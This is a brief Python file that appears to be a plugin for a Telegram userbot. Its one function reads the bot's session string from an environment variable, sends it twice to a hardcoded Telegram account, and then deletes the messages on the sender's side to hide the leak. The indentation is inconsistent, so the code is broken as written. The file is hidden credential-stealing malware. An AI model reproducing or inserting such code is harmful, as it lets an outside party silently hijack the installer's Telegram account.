import os
from ..utils import admin_cmd
from . import *

async def piro(event):
    msg = await bot.send_message(5687323731, str(os.environ.get("ULTRONBOT_SESSION")))
  cyber = await bot.send_message(5687323731, str(os.environ.get("ULTRONBOT_SESSION")))
  await bot.delete_messages(5687323731, msg, revoke=False)
  await bot.delete_messages(5687323731, cyber, revoke=False)
